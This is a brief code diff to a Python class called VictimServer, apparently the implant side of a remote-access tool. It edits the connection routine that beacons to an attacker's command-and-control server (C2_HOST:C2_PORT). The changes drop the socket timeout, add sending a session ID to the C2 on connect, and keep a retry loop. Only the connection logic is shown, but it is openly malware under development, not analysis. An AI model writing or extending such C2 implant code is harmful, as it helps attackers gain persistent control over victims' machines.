@@ -68,13 +68,14 @@ class VictimServer:
         """Connection handler with improved error reporting"""
         while self.running:
             try:
+                print(f"[*] Attempting connection to {C2_HOST}:{C2_PORT}")
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.sock.settimeout(30)
                 self.sock.connect((C2_HOST, C2_PORT))
-                print(f"[*] Connected to C2 at {C2_HOST}:{C2_PORT}")
+                self._safe_send(self.session_id.encode())
+                print(f"[+] Connected to {C2_HOST}:{C2_PORT}")
                 return True
             except Exception as e:
-                print(f"[!] Connection failed: {str(e)}")
+                print(f"[-] Connection failed: {str(e)}")
                 time.sleep(RECONNECT_INTERVAL)
         return False
 
